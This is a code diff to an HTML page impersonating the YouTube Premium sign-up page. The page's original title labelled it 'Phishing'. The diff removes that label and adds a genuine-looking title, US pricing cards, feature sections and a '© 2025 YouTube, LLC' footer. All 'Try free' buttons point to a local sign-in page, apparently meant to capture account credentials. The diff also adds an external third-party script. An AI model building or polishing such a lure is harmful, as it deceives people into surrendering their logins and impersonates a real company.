@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube Premium (Phishing)</title>
+    <title>YouTube Premium - Ad-Free Videos, Offline & Background Play</title>
     <link rel="icon" href="https://www.youtube.com/s/desktop/a386e432/img/favicon_32.png" type="image/x-icon">
 
     <!-- css -->
@@ -19,49 +19,59 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
         integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
 
-    <!-- Google Tag Manager -->
-    <script>
-        (function (w, d, s, l, i) {
-            w[l] = w[l] || [];
-            w[l].push({
-                'gtm.start': new Date().getTime(),
-                event: 'gtm.js'
-            });
-            var f = d.getElementsByTagName(s)[0],
-                j = d.createElement(s),
-                dl = l != 'dataLayer' ? '&l=' + l : '';
-            j.async = true;
-            j.src =
-                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
-            f.parentNode.insertBefore(j, f);
-        })(window, document, 'script', 'dataLayer', 'GTM-PLDGLJQ');
-    </script>
-
     <style>
-        #accordionDetail1 {
-            display: none;
+        .feature-card {
+            background: #f9f9f9;
+            border-radius: 8px;
+            padding: 30px;
+            margin: 20px 0;
+            text-align: center;
         }
 
-        #accordionDetail2 {
-            display: none;
+        .feature-card img {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            margin-bottom: 20px;
         }
 
-        #accordionDetail3 {
-            display: none;
+        .pricing-card {
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 30px;
+            margin: 15px;
+            transition: transform 0.3s;
         }
 
-        #accordionDetail4 {
-            display: none;
+        .pricing-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .pricing-card.featured {
+            border-color: #065fd4;
+            background: #f0f7ff;
+        }
+
+        .price {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #065fd4;
+        }
+
+        .new-badge {
+            background: #ff0000;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            font-weight: bold;
         }
     </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
 </head>
 
 <body>
-
-    <!-- Google Tag Manager (noscript) -->
-    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PLDGLJQ" height="0" width="0"
-            style="display:none;visibility:hidden"></iframe></noscript>
-    <!-- End Google Tag Manager (noscript) -->
 
     <!-------------------------------------------------------------------------------------------- Nav Bar -->
     <!------------------------------------------------------------------------------------------------------->
@@ -123,47 +133,11 @@
                     </g>
                 </g>
             </svg>
-            <p>TH</p>
+            <p>US</p>
         </div>
-
-        <!-- section-center : search bar -->
-        <form class="search-bar hidden-mobile">
-            <input class="search-input" type="search" placeholder="Search" aria-label="Search" />
-            <button type="submit" class="search-btn"><i class="far fa-search"></i></button>
-        </form>
 
         <!-- section-right : tool bar -->
         <div class="tool-bar">
-            <div class="icon-tool hidden-mobile">
-                <svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
-                    style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
-                    <g>
-                        <path path fill="#606060"
-                            d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4zM14 13h-3v3H9v-3H6v-2h3V8h2v3h3v2z">
-                        </path>
-                    </g>
-                </svg>
-            </div>
-            <div class="icon-tool hidden-mobile">
-                <svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
-                    style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
-                    <g>
-                        <path path fill="#606060"
-                            d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z">
-                        </path>
-                    </g>
-                </svg>
-            </div>
-            <div class="icon-tool">
-                <svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
-                    style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
-                    <g>
-                        <path path fill="#606060"
-                            d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z">
-                        </path>
-                    </g>
-                </svg>
-            </div>
             <div class="sign-in">
                 <svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet" focusable="false"
                     style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;">
@@ -191,284 +165,260 @@
             </h2>
 
             <a href="signin.html">
-                <button class="btn btn-primary btn-sm d-block mx-auto"
-                    style="background-color: #065fd4;border-radius: 0px;">TRY IT FREE</button>
+                <button class="btn btn-primary btn-lg d-block mx-auto"
+                    style="background-color: #065fd4;border-radius: 2px; padding: 12px 40px;">TRY IT FREE</button>
             </a><br>
 
             <div class="detail-content">
-                <h4 class="text-center font-weight-light">10-month free trial • Then THB 159.00/month</h4>
+                <h4 class="text-center font-weight-light">1-month free trial • Then $13.99/month</h4>
                 <h6 class="text-center font-weight-light">We'll remind you 7 days before your trial ends<br>Recurring
-                    billing • Cancel anytime</h6>
+                    billing. Cancel anytime.</h6>
+                <p class="text-center" style="font-size: 0.8em; color: #606060;">Restrictions apply. <a href="#"
+                        style="color: #065fd4;">See Terms</a></p>
             </div>
-
-
-
-            <div class="link-all center-dis">
-                <!-- Link 1 -->
-                <div class="link1 text-center" id="link1" onclick="replace()">
-                    <p>Or save money with a <a style="color: var(--blue);">family or student plan</a></p>
-                </div>
-                <div class="link1_detail" id="link1_detail">
-                    <div class="row">
-                        <div class="col-8">
-                            <p>Family • 10-month free trial • Then THB 239.00/month</p>
-                            <p>Add up to 5 family members (ages 13+) in your household. <a target="_blank"
-                                    href="https://support.google.com/youtube/answer/7507349?visit_id=637402471130074390-2032857715&p=red_family_overview&hl=en&rd=1">Learn
-                                    more</a></p>
-                        </div>
-                        <div class="col-4">
-                            <a href="signin.html">
-                                <button style="margin: auto 0 auto auto !important;"
-                                    class="btn mybtn btn-primary btn-sm d-block mx-auto"
-                                    style="background-color: #065fd4;border-radius: 0px;">TRY IT FREE</button>
-                            </a>
-                        </div>
-                    </div>
-                    <div class="row">
-                        <div class="col-7">
-                            <p>Student • THB 95.00/month</p>
-                            <p>Eligible students only. Annual verification required.</p>
-                        </div>
-                        <div class="col-5" style="float: right;">
-                            <a href="signin.html">
-                                <button style="margin: auto 0 auto auto !important;"
-                                    class="btn mybtn btn-primary btn-sm d-block mx-auto"
-                                    style="background-color: #065fd4;border-radius: 0px;">
-                                    <svg viewBox="0 0 48 48" preserveAspectRatio="xMidYMid meet" focusable="false"
-                                        style="pointer-events: none; display: block; width: 1.5em; height: 1.5em;"
-                                        class="style-scope yt-icon">
-                                        <g fill="#fff" viewBox="0 0 48 48" class="style-scope yt-icon">
-                                            <path
-                                                d="M38 38H10V10h14V6H10c-2.21 0-4 1.79-4 4v28c0 2.21 1.79 4 4 4h28c2.21 0 4-1.79 4-4V24h-4v14zM28 6v4h7.17L15.51 29.66l2.83 2.83L38 12.83V20h4V6H28z"
-                                                class="style-scope yt-icon"></path>
-                                        </g>
-                                    </svg>
-                                    TRY IT FREE</button>
-                            </a>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Link 2 -->
-                <p class="text-center"><a class="accordion">Restrictions apply. Learn more here.</a></p>
-            </div>
-
         </section>
+
+        <!-------------------------------------------------------------------------------------------- Pricing Plans -->
+        <!--------------------------------------------------------------------------------------------------------->
+        <section class="py-5">
+            <h2 class="text-center mb-5">Choose Your Premium Plan</h2>
+            <div class="row">
+                <div class="col-md-3">
+                    <div class="pricing-card">
+                        <h4>Premium Lite</h4>
+                        <span class="new-badge">NEW</span>
+                        <div class="price">$7.99</div>
+                        <p class="text-muted">per month</p>
+                        <hr>
+                        <ul class="text-left" style="list-style: none; padding: 0;">
+                            <li>✓ Ad-free videos</li>
+                            <li>✗ No downloads</li>
+                            <li>✗ No background play</li>
+                            <li>✗ No YouTube Music</li>
+                        </ul>
+                        <a href="signin.html"><button class="btn btn-outline-primary btn-block mt-3">Get Started</button></a>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="pricing-card featured">
+                        <h4>Individual</h4>
+                        <span class="badge badge-primary">POPULAR</span>
+                        <div class="price">$13.99</div>
+                        <p class="text-muted">per month</p>
+                        <hr>
+                        <ul class="text-left" style="list-style: none; padding: 0;">
+                            <li>✓ Ad-free videos</li>
+                            <li>✓ Offline downloads</li>
+                            <li>✓ Background play</li>
+                            <li>✓ YouTube Music Premium</li>
+                            <li>✓ High-quality audio</li>
+                        </ul>
+                        <a href="signin.html"><button class="btn btn-primary btn-block mt-3">Try Free</button></a>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="pricing-card">
+                        <h4>Family</h4>
+                        <div class="price">$22.99</div>
+                        <p class="text-muted">per month</p>
+                        <hr>
+                        <ul class="text-left" style="list-style: none; padding: 0;">
+                            <li>✓ Up to 6 accounts</li>
+                            <li>✓ All Individual features</li>
+                            <li>✓ Household members only</li>
+                            <li>✓ Separate recommendations</li>
+                        </ul>
+                        <a href="signin.html"><button class="btn btn-outline-primary btn-block mt-3">Get Started</button></a>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="pricing-card">
+                        <h4>Student</h4>
+                        <div class="price">$7.99</div>
+                        <p class="text-muted">per month</p>
+                        <hr>
+                        <ul class="text-left" style="list-style: none; padding: 0;">
+                            <li>✓ All Individual features</li>
+                            <li>✓ Verification required</li>
+                            <li>✓ Annual re-verification</li>
+                            <li>✓ Eligible students only</li>
+                        </ul>
+                        <a href="signin.html"><button class="btn btn-outline-primary btn-block mt-3">Verify Eligibility</button></a>
+                    </div>
+                </div>
+            </div>
+            <p class="text-center mt-4"><strong>Save 15%</strong> with an annual Individual plan at <strong>$139.99/year</strong></p>
+        </section>
+
+        <!-------------------------------------------------------------------------------------------- Features -->
+        <!--------------------------------------------------------------------------------------------------------->
+        <section class="py-5">
+            <h2 class="text-center mb-5">Premium Features</h2>
+
+            <div class="feature-card">
+                <div class="row align-items-center">
+                    <div class="col-md-6">
+                        <img src="img/ad_free_feature.jpg" alt="Ad-Free Viewing">
+                    </div>
+                    <div class="col-md-6 text-left">
+                        <h3>Watch Without Interruptions</h3>
+                        <p class="lead">Enjoy millions of videos without ads across all your devices. No pre-roll, mid-roll, or banner ads to interrupt your viewing experience.</p>
+                        <ul>
+                            <li>Ad-free on YouTube, YouTube Music, and YouTube Kids</li>
+                            <li>Works on mobile, desktop, TV, and gaming consoles</li>
+                            <li>Creator promotions still visible to support your favorites</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="feature-card">
+                <div class="row align-items-center">
+                    <div class="col-md-6 order-md-2">
+                        <img src="img/background_play.jpg" alt="Background Play">
+                    </div>
+                    <div class="col-md-6 order-md-1 text-left">
+                        <h3>Keep Playing in the Background</h3>
+                        <p class="lead">Listen to videos and music even when your screen is off or you're using other apps.</p>
+                        <ul>
+                            <li>Perfect for music, podcasts, and audio content</li>
+                            <li>Picture-in-Picture mode for multitasking</li>
+                            <li>Works with headphones and Bluetooth devices</li>
+                            <li><span class="new-badge">NEW</span> PiP for YouTube Shorts on iOS</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="feature-card">
+                <div class="row align-items-center">
+                    <div class="col-md-6">
+                        <img src="img/offline_downloads.jpg" alt="Offline Downloads">
+                    </div>
+                    <div class="col-md-6 text-left">
+                        <h3>Download and Watch Offline</h3>
+                        <p class="lead">Save videos and playlists to watch later without an internet connection.</p>
+                        <ul>
+                            <li>Download videos in the YouTube app</li>
+                            <li>Save songs and albums in YouTube Music</li>
+                            <li>Smart Downloads automatically adds recommended content</li>
+                            <li><span class="new-badge">NEW</span> Smart Downloads for Shorts</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="feature-card">
+                <div class="row align-items-center">
+                    <div class="col-md-6 order-md-2">
+                        <img src="img/youtube_music.jpg" alt="YouTube Music Premium">
+                    </div>
+                    <div class="col-md-6 order-md-1 text-left">
+                        <h3>YouTube Music Premium Included</h3>
+                        <p class="lead">Full access to YouTube Music with ad-free listening, downloads, and background play.</p>
+                        <ul>
+                            <li>Over 100 million songs and music videos</li>
+                            <li><span class="new-badge">NEW</span> High-quality 256kbps audio</li>
+                            <li>Audio-only mode to save data</li>
+                            <li><span class="new-badge">NEW</span> Ask Music AI for personalized recommendations</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-------------------------------------------------------------------------------------------- New Features 2025 -->
+        <!--------------------------------------------------------------------------------------------------------->
+        <section class="py-5" style="background: #f0f7ff; margin: 40px -15px; padding: 40px 15px !important;">
+            <div class="container">
+                <h2 class="text-center mb-5">New in 2025 <span class="new-badge">NEW</span></h2>
+                <div class="row">
+                    <div class="col-md-4 mb-4">
+                        <div class="card h-100">
+                            <div class="card-body">
+                                <h4>🎵 High-Quality Audio</h4>
+                                <p>Experience music videos with enhanced 256kbps audio for crystal-clear sound quality.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4">
+                        <div class="card h-100">
+                            <div class="card-body">
+                                <h4>⏭️ Jump Ahead</h4>
+                                <p>Skip straight to the most popular parts of videos with our AI-powered feature, now on web.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4">
+                        <div class="card h-100">
+                            <div class="card-body">
+                                <h4>🤖 Conversational AI</h4>
+                                <p>Ask questions about videos you're watching and get instant answers without interrupting playback.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4">
+                        <div class="card h-100">
+                            <div class="card-body">
+                                <h4>⚡ Faster Playback</h4>
+                                <p>Watch videos at speeds up to 4x on mobile devices for efficient content consumption.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4">
+                        <div class="card h-100">
+                            <div class="card-body">
+                                <h4>📱 Shorts Features</h4>
+                                <p>Picture-in-Picture and Smart Downloads now available for YouTube Shorts on iOS.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-4">
+                        <div class="card h-100">
+                            <div class="card-body">
+                                <h4>☁️ Google One Bundle</h4>
+                                <p>Save money by bundling YouTube Premium with Google One Premium for cloud storage.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-------------------------------------------------------------------------------------------- CTA -->
+        <!--------------------------------------------------------------------------------------------------------->
+        <section class="text-center py-5">
+            <h2>Ready to upgrade your YouTube experience?</h2>
+            <p class="lead">Start your 1-month free trial today. Cancel anytime.</p>
+            <a href="signin.html">
+                <button class="btn btn-primary btn-lg" style="background-color: #065fd4; padding: 15px 50px; font-size: 1.2em;">
+                    TRY YOUTUBE PREMIUM FREE
+                </button>
+            </a>
+            <p class="mt-3 text-muted">$13.99/month after trial. Terms apply.</p>
+        </section>
+
     </div>
 
-    <div class="container-lg">
-        <!-------------------------------------------------------------------------------------------- Section 2 -->
-        <!--------------------------------------------------------------------------------------------------------->
-        <section class="content-2 center-dis">
+    <!-- Footer -->
+    <footer class="bg-light py-4 mt-5">
+        <div class="container">
             <div class="row">
-                <div class="col-md-4">
-                    <img src="img/ytr_lp2_icon_feature_playtransparent_168x168.png" class="d-block mx-auto w-25 ">
-                    <br>
-                    <h2 class="text-center font-weight-light">Ad-free & background play</h2>
-                    <p class="text-center">Watch videos uninterrupted by ads, while using other apps, or when the screen
-                        is locked.</p>
-                </div>
-                <div class="col-md-4">
-                    <img src="img/ytm_lp2_icon_feature_download_168x168.png" class="d-block mx-auto w-25 ">
-                    <br>
-                    <h2 class="text-center font-weight-light">Downloads</h2>
-                    <p class="text-center">Save videos for when you really need them – like when you’re on a plane or
-                        commuting.
+                <div class="col-md-12 text-center text-muted">
+                    <p>&copy; 2025 YouTube, LLC. All rights reserved.</p>
+                    <p>
+                        <a href="#" class="text-muted">Terms</a> •
+                        <a href="#" class="text-muted">Privacy</a> •
+                        <a href="#" class="text-muted">Help</a>
                     </p>
                 </div>
-                <div class="col-md-4">
-                    <img src="img/ytr_lp2_icon_feature_musicapp_168x168.png" class="d-block mx-auto w-25 ">
-                    <br>
-                    <h2 class="text-center font-weight-light">YouTube Music<br>Premium</h2>
-                    <p class="text-center">Download our new music app and listen without interruptions.</p>
-                </div>
             </div>
-        </section>
+        </div>
+    </footer>
 
-        <!-------------------------------------------------------------------------------------------- Section 3 -->
-        <!--------------------------------------------------------------------------------------------------------->
-
-        <section class="content-3">
-            <div class="content-3-bg">
-                <div class="row">
-                    <div class="col-6">
-                        <h1 style="font-weight: 300;">Uninterrupted YouTube</h1>
-                        <h5 tyle="font-weight: 200;">Watch your favorite videos ad-free, offline, and keep them playing
-                            when you close the app.</h5>
-                    </div>
-                </div>
-            </div>
-
-        </section>
-
-        <section class="content-4">
-            <div class="content-4-bg">
-                <div class="row">
-                    <div class="col-5"></div>
-                    <div class="col-7">
-                        <h1 style="font-weight: 300;">YouTube Music Premium</h1>
-                        <h5 tyle="font-weight: 200;">Get YouTube’s music streaming service ad-free, offline, and with
-                            the screen locked.</h5>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <br><br><br>
-
-        <section class="content-5" id="app">
-            <h3 class="font-weight-light">{{ faq }}</h3>
-            <br />
-            <div class="accordion">
-                <div class="accordionTab" @click="openAccordion(1)">
-                    What is included with YouTube Premium?
-                    <span class="float-right" id="arrow1" style="font-size: 0.9em"><i
-                            class="fas fa-chevron-down"></i></span>
-                </div>
-                <p id="accordionDetail1" class="font-weight-light" style="margin-top: 1.25em; font-size: 16px">
-                    <b>YouTube</b><br /> • Ad-free videos: Watch millions of videos uninterrupted by ads.
-                    <a href="https://support.google.com/youtube/answer/6308116">Learn more</a><br /> • Download videos
-                    to watch offline: Save videos and playlists on mobile devices and play them offline<br /> • Play in
-                    the background: Keep videos playing
-                    when using other apps or when your screen is off<br />
-                    <b>YouTube Music</b><br /> • Easily explore the world of music with the new and improved YouTube
-                    Music app<br /> • Ad-free music: Listen to millions of songs uninterrupted by ads<br /> • Download
-                    music to listen offline: Save music
-                    and playlists in the YouTube Music app and listen offline<br /> • Play in the background: Keep music
-                    playing when using other apps or when your screen is off<br />
-                    <b>YouTube Kids</b><br /> • Ad-free and offline play in the YouTube Kids app<br />
-                    <b>Google Play Music</b><br /> • Included at no additional cost for select countries. Click here to
-                    see if Google Play Music is available in your country.
-                </p>
-            </div>
-            <div class="accordion">
-                <div class="accordionTab" @click="openAccordion(2)">
-                    How does downloading videos and music work?
-                    <span class="float-right" id="arrow2" style="font-size: 0.9em"><i
-                            class="fas fa-chevron-down"></i></span>
-                </div>
-                <p id="accordionDetail2" class="font-weight-light" style="margin-top: 1.25em; font-size: 16px">
-                    Download videos and music on your mobile devices to watch and listen offline for up to 30 days
-                    without being connected to the internet. For more details on how to download videos and music,
-                    please see this Help Center article.
-                </p>
-            </div>
-            <div class="accordion">
-                <div class="accordionTab" @click="openAccordion(3)">
-                    What is background play?
-                    <span class="float-right" id="arrow3" style="font-size: 0.9em"><i
-                            class="fas fa-chevron-down"></i></span>
-                </div>
-                <p id="accordionDetail3" class="font-weight-light" style="margin-top: 1.25em; font-size: 16px">
-                    Background play allows videos and music to keep playing in the background, even when you open other
-                    apps or turn the screen off on your mobile device. For more details on background play, please see
-                    this Help Center article.
-                </p>
-            </div>
-            <div class="accordion">
-                <div class="accordionTab" @click="openAccordion(4)">
-                    How can I cancel my membership?
-                    <span class="float-right" id="arrow4" style="font-size: 0.9em"><i
-                            class="fas fa-chevron-down"></i></span>
-                </div>
-                <p id="accordionDetail4" class="font-weight-light" style="margin-top: 1.25em; font-size: 16px">
-                    You can cancel your membership by visiting the Paid Membership page. This will revert your account
-                    to free YouTube. You can rejoin YouTube Premium at any time.
-                </p>
-            </div>
-            <br><br>
-            <p class="my-5" style="font-size: 18px;">Have other questions? Visit the <a
-                    href="https://support.google.com/youtube/go/red_help">YouTube Help Center</a></p>
-        </section>
-
-    </div>
-
-
-
-
-    <!-------------------------------------------------------------------------------------------- Script -->
-    <!------------------------------------------------------------------------------------------------------>
-
-    <!-- bootstrap -->
-
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
-        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
-        crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"
-        integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx"
-        crossorigin="anonymous"></script>
-
-    <!-- fontawsome -->
-    <script src="https://kit.fontawesome.com/6ddd12fa46.js" crossorigin="anonymous"></script>
-
-
-    <!-- vue cdn -->
-    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.12/dist/vue.js"></script>
-
-    <script>
-        // Vue CDN
-
-        var app = new Vue({
-            el: '#app',
-            data: {
-                accordionStatus: [false, false, false, false],
-                faq: 'FAQ'
-            },
-            methods: {
-                openAccordion: function (id) {
-                    if (this.accordionStatus[id - 1] == false) {
-                        document.querySelector("#arrow" + id).innerHTML =
-                            '<i class="fas fa-chevron-up"></i>';
-                        document.querySelector("#accordionDetail" + id).style.display = "block";
-                        this.accordionStatus[id - 1] = true;
-                    } else {
-                        document.querySelector("#arrow" + id).innerHTML =
-                            '<i class="fas fa-chevron-down"></i>';
-                        document.querySelector("#accordionDetail" + id).style.display = "none";
-                        this.accordionStatus[id - 1] = false;
-                    }
-                },
-            }
-        })
-
-        // ---------------------------------------------------------- Modal Function
-
-        // Get the modal
-        var modal = document.getElementById("myModal");
-
-        // Get the button that opens the modal
-        var btn = document.getElementById("myBtn");
-
-        // Get the <span> element that closes the modal
-        var span = document.getElementsByClassName("myClose")[0];
-
-        // When the user clicks the button, open the modal 
-        btn.onclick = function () {
-            modal.style.display = "block";
-        }
-
-        // When the user clicks on <span> (x), close the modal
-        span.onclick = function () {
-            modal.style.display = "none";
-        }
-
-        // When the user clicks anywhere outside of the modal, close it
-        window.onclick = function (event) {
-            if (event.target == modal) {
-                modal.style.display = "none";
-            }
-        }
-
-        // ---------------------------------------------------------- Accordion Function
-
-        function replace() {
-            document.getElementById('link1').style.display = "none";
-            document.getElementById('link1_detail').style.display = "block";
-        }
-    </script>
-
-    </script>
-
+    <!-- Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
 
 </body>
 
